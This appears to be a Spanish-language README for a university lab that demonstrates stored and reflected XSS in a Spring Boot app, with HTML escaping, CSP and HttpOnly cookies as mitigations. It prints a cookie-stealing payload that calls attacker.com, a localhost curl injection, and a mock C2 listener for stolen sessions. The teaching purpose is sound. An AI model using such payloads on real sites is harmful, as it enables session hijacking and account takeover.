# Demostración en Vivo: Cross-Site Scripting (XSS) y Content Security Policy (CSP)

### 📌 Asignatura: Ciberseguridad Aplicada · UC2 (Evaluación 20%)
### 👥 Equipo:
* **Erick Sebastian Moreno Vargas**
* **Luciano Barcelo Murrieta**
* **Benjamin Soto Coronado**

---

## 🎯 Resumen Ejecutivo y Alineación con la Presentación

Este proyecto implementa la demostración práctica y en vivo de **OWASP Top 3:2021 – Injection / Cross-Site Scripting (XSS)** y la implementación de **Políticas de Seguridad de Contenido (CSP)** como mitigación, en estricta correspondencia con las diapositivas del equipo y el requerimiento del profesor para el laboratorio.

| Diapositiva | Concepto en la Presentación | Implementación en este Proyecto |
| :--- | :--- | :--- |
| **05. XSS (A03:2021)** | Metáfora de la carta interceptada con mensaje oculto malicioso. | Muro de comentarios interactivo donde entradas maliciosas son procesadas y ejecutadas por el navegador cliente. |
| **06. Explotación** | Payload Malicioso (Stored XSS):<br>`<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>` | Inyección del payload en el Muro Vulnerable (`POST /api/vulnerable/comentarios`) y exfiltración en tiempo real al servidor C2 del atacante (`/api/attacker/steal`). |
| **06. Defensa 1** | Codificación: `htmlspecialchars($input, ENT_QUOTES, 'UTF-8');` | Sanitización de salida en Java Spring con `HtmlUtils.htmlEscape()` (`POST /api/mitigado/comentarios`), neutralizando el script como texto inofensivo. |
| **06. Defensa 2** | `Content-Security-Policy: default-src 'self'; script-src 'self';` | Endpoint protegido (`GET /mitigado/muro-csp-html`) con la cabecera CSP exacta, provocando que el navegador bloquee la ejecución de scripts inline. |
| **Defensa Extra** | Mitigación del secuestro de sesión (Session Hijacking). | Demostración de cookies protegidas con bandera `HttpOnly; SameSite=Strict; Secure`, inaccesibles para JavaScript (`document.cookie`). |

---

## 🏗️ Arquitectura y Estructura del Código

El proyecto está desarrollado en **Java Spring Boot 3** (Java 17/21) y sigue la misma estructura limpia y didáctica del módulo de *Broken Access Control*:

```text
Cross-Site Scripting (XSS)/
│
├── pom.xml                               # Configuración Maven (Spring Boot 3.3.4, Security, JPA, H2)
├── postman_collection.json               # Colección de Postman lista para importar
├── README.md                             # Guía completa del laboratorio y guion de exposición
│
└── src/
    ├── main/
    │   ├── java/com/ciberseguridad/xss/
    │   │   ├── XssApplication.java       # Clase principal de arranque de Spring Boot
    │   │   ├── DataLoader.java           # Precarga de datos en H2 y mensaje inicial
    │   │   │
    │   │   ├── config/
    │   │   │   └── SecurityConfig.java   # Configuración de Spring Security y acceso público
    │   │   │
    │   │   ├── model/
    │   │   │   ├── Comentario.java       # Entidad JPA para comentarios del foro/muro
    │   │   │   └── RoboRegistro.java     # Entidad JPA para almacenar robos de credenciales en el C2
    │   │   │
    │   │   ├── repository/
    │   │   │   ├── ComentarioRepository.java
    │   │   │   └── RoboRegistroRepository.java
    │   │   │
    │   │   ├── vulnerable/               # 🔴 CÓDIGO VULNERABLE (Stored & Reflected XSS)
    │   │   │   └── VulnerableXssController.java
    │   │   │
    │   │   ├── mitigado/                 # 🟢 CÓDIGO MITIGADO (Escape HTML, CSP y HttpOnly)
    │   │   │   └── MitigadoXssController.java
    │   │   │
    │   │   └── attacker/                 # 🕵️ SERVIDOR DEL ATACANTE (Listener C2)
    │   │       └── AttackerC2Controller.java
    │   │
    │   └── resources/
    │       ├── application.properties    # Configuración de puerto 8081 y BD H2
    │       └── static/                   # 💻 INTERFAZ WEB INTERACTIVA PARA EL LABORATORIO
    │           ├── index.html            # Dashboard en vivo con comparador visual
    │           ├── style.css             # Estilos oscuros modernos con temática de ciberseguridad
    │           └── app.js                # Lógica del cliente, presets de payloads y monitoreo
    │
    └── test/
        └── java/com/ciberseguridad/xss/
            └── XssDemonstrationTest.java # Pruebas unitarias automatizadas con MockMvc
```

> **Nota de compatibilidad:** Este proyecto corre por defecto en el puerto **`8081`** (`http://localhost:8081`). Esto permite tener corriendo simultáneamente en el laboratorio tanto *Broken Access Control* (puerto 8080) como *Cross-Site Scripting* (puerto 8081) sin ningún conflicto de puertos.

---

## 🚀 Requisitos e Inicio Rápido

### Requisitos Previos:
- **JDK 17 o superior** (probado con Java 21).
- **Apache Maven 3.8+** (o el wrapper si está disponible).
- Navegador moderno (Chrome, Edge, Firefox, Brave) para inspeccionar la consola de desarrollador (F12).

### Paso 1: Navegar a la carpeta del proyecto
Abre una terminal PowerShell o CMD:
```bash
cd "Cross-Site Scripting (XSS)"
```

### Paso 2: Ejecutar las pruebas automatizadas
Para verificar que todos los casos de prueba (vulnerables y defensivos) funcionan a la perfección:
```bash
mvn clean test
```

### Paso 3: Iniciar el servidor Spring Boot
```bash
mvn spring-boot:run
```
El servidor arrancará en: **`http://localhost:8081`**.

---

## 🧪 Guía de Demostración en el Laboratorio (Paso a Paso)

### Opción A: Demostración Visual e Interactiva (Recomendada para la Presentación)

1. Abre tu navegador en **`http://localhost:8081`**.
2. **Pestaña 1: Demo en Vivo (Stored XSS)**:
   - Haz clic en el botón de payload rápido: `🎯 Slide 6: Robo de Cookie (fetch)`.
   - Se cargará el código exacto de la Diapositiva 6:
     ```html
     <script>fetch('/api/attacker/steal?cookie=' + encodeURIComponent(document.cookie));</script>
     ```
   - Haz clic en **"🔴 Publicar en Muro Vulnerable"**.
   - En la columna izquierda (roja), el comentario se inserta en el DOM. El navegador de la víctima ejecuta el script de inmediato.
   - En el monitor de terminal verás el evento registrado.
   - Ve a la pestaña **"🕵️ Servidor del Atacante (C2)"**: ¡verás la fila con la cookie de la víctima capturada (`victima_session_id=SECRET998877`), consumando el **Secuestro de Cuenta (Account Takeover)**!
3. **Demostración de la Mitigación 1 (Codificación de Salida)**:
   - Vuelve a la pestaña "Demo en Vivo".
   - Con el mismo payload malicioso, haz clic en **"🟢 Publicar en Muro Mitigado (HtmlUtils)"**.
   - En la columna derecha (verde), verás que el código malicioso se muestra como texto plano:
     `&lt;script&gt;fetch(...)&lt;/script&gt;`.
   - **Explicación para el profesor:** El método `HtmlUtils.htmlEscape()` neutralizó los delimitadores `<` y `>`, por lo que el navegador los trata como texto literal y no los interpreta como instrucciones ejecutables.
4. **Demostración de la Mitigación 2 (Content Security Policy - CSP)**:
   - Dirígete a la pestaña **"🛡️ Mitigación: CSP (Diapositiva 6)"**.
   - Haz clic en **"🚀 Abrir Página con Cabecera CSP en Nueva Pestaña"** (`/mitigado/muro-csp-html`).
   - Abre las herramientas de desarrollo (**F12 -> Consola**).
   - Observa el mensaje en rojo arrojado por el navegador:
     > `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'"`
   - **Explicación:** La cabecera CSP `default-src 'self'; script-src 'self'` prohíbe taxativamente la ejecución de scripts no autorizados o inline, protegiendo al usuario incluso si el desarrollador olvidó sanitizar alguna entrada.
5. **Demostración de la Mitigación 3 (Cookies con Bandera HttpOnly)**:
   - Dirígete a la pestaña **"🍪 Cookies e HttpOnly"**.
   - Presiona **"Generar Cookies de Prueba"** y luego **"Inspeccionar qué ve document.cookie"**.
   - Observarás que solo `cookie_vulnerable_js` es visible, mientras que `cookie_segura_httponly` es invisible para JavaScript.

---

### Opción B: Demostración mediante cURL (Desde Terminal)

Si el profesor solicita comprobar los endpoints directamente mediante consola:

#### 1. Inyección de Stored XSS en el Endpoint Vulnerable:
```bash
curl -i -X POST http://localhost:8081/api/vulnerable/comentarios \
  -H "Content-Type: application/json" \
  -d "{\"autor\":\"Atacante\",\"contenido\":\"<script>fetch('http://localhost:8081/api/attacker/steal?cookie=' + encodeURIComponent(document.cookie));</script>\"}"
```
**Respuesta:** HTTP `200 OK` (Almacenado sin sanitizar en la base de datos).

#### 2. Consulta del Muro Vulnerable:
```bash
curl -i http://localhost:8081/api/vulnerable/comentarios
```
**Respuesta:** Retorna el JSON con las etiquetas `<script>` intactas.

#### 3. Inyección en el Endpoint Mitigado (Escape HTML):
```bash
curl -i -X POST http://localhost:8081/api/mitigado/comentarios \
  -H "Content-Type: application/json" \
  -d "{\"autor\":\"Usuario Seguro\",\"contenido\":\"<script>alert('xss');</script>\"}"
```
**Respuesta:** HTTP `200 OK`:
```json
{
  "mensaje": "Comentario sanitizado y almacenado de forma segura.",
  "original": "<script>alert('xss');</script>",
  "sanitizado": "&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;",
  "defensaAplicada": "Codificación de Entidades HTML (HtmlUtils.htmlEscape / htmlspecialchars)"
}
```

#### 4. Comprobación de Cabecera CSP en el Endpoint Seguro:
```bash
curl -i http://localhost:8081/mitigado/muro-csp-html
```
**Respuesta:**
```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
Content-Type: text/html;charset=UTF-8
```

#### 5. Consulta de Cookies Robadas en el Servidor C2 del Atacante:
```bash
curl -i http://localhost:8081/api/attacker/logs
```

---

## 🎤 Guion de Exposición para la Clase (Notas del Orador)

Usa esta secuencia durante tu turno de exposición:

### 1. Diapositiva 5: Concepto e Introducción
> *"Buenos días profesor y compañeros. Hoy les presentaremos la vulnerabilidad de Cross-Site Scripting (XSS), clasificada como la categoría A03:2021 de Inyección en el OWASP Top 10.*
>
> *Para entenderlo de manera sencilla, usamos la metáfora de la carta: Imaginen que envían una carta a un amigo que confía plenamente en ustedes. Un atacante intercepta la carta, inserta instrucciones ocultas y la reenvía. El amigo, al abrirla y leerla, ejecuta esas instrucciones pensando que provienen de ustedes.*
>
> *En una aplicación web ocurre exactamente lo mismo: el atacante logra inyectar código JavaScript malicioso en una página web legítima, y el navegador de la víctima lo ejecuta confiando plenamente en el sitio."*

### 2. Diapositiva 6: Explotación y Robo de Sesión
> *"En la Diapositiva 6 vemos un ataque típico de Stored XSS. El atacante introduce el payload:*
> `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>`
>
> *(Demostración en vivo)*: *Aquí en nuestro laboratorio tenemos un muro de comentarios. Como atacantes, publicamos este payload en el endpoint vulnerable.*
>
> *Cuando un usuario normal visita el muro, su navegador procesa el HTML y ejecuta la función fetch en segundo plano. La cookie de sesión se envía a nuestro servidor de comando y control (C2). Al revisar el panel del atacante, observamos que ya capturamos la cookie de la víctima, consumando un Account Takeover o Secuestro de Cuenta sin haber requerido contraseñas."*

### 3. Diapositiva 6: Defensas (Mitigación)
> *"Para protegernos, la Diapositiva 6 establece dos estrategias fundamentales:*
>
> *1. **Codificación y Sanitización**: En PHP se utiliza `htmlspecialchars`, mientras que en Java Spring Boot usamos `HtmlUtils.htmlEscape()`. Si publicamos el mismo payload en el endpoint mitigado, el código malicioso se transforma en entidades HTML inofensivas como `&lt;script&gt;`, mostrándose como texto plano.*
>
> *2. **Content Security Policy (CSP)**: Mediante la cabecera HTTP `Content-Security-Policy: default-src 'self'; script-src 'self'`, instruimos al navegador a rechazar de raíz la ejecución de scripts inline y conexiones a dominios desconocidos.*
>
> *3. **Defensa en Profundidad**: Marcando nuestras cookies con el flag `HttpOnly`, `document.cookie` no puede leerlas jamás desde JavaScript, anulando el impacto del ataque.*
>
> *Con esto demostramos tanto la explotación como la prevención completa de XSS."*

---

## 📊 Cobertura de Pruebas Automatizadas (`mvn test`)

El proyecto incluye pruebas completas en `XssDemonstrationTest.java`:
- `testVulnerableAlmacenaScriptSinEscapar`: Valida la persistencia del payload sin alterar en el endpoint vulnerable.
- `testVulnerableMuroConcatenaScriptDirecto`: Valida el renderizado vulnerable en HTML.
- `testReflectedXssVulnerable`: Valida la inyección inmediata en búsquedas reflejadas.
- `testMitigadoEscapaEntidadesHtml`: Valida la transformación de `<script>` en `&lt;script&gt;`.
- `testMitigadoAplicaContentSecurityPolicy`: Valida la emisión de la cabecera CSP requerida.
- `testMitigadoConfiguraCookiesHttpOnly`: Valida la emisión de cookies con atributo `HttpOnly`.
- `testAttackerC2RegistraRobo`: Valida el registro de exfiltración de credenciales en el listener C2.
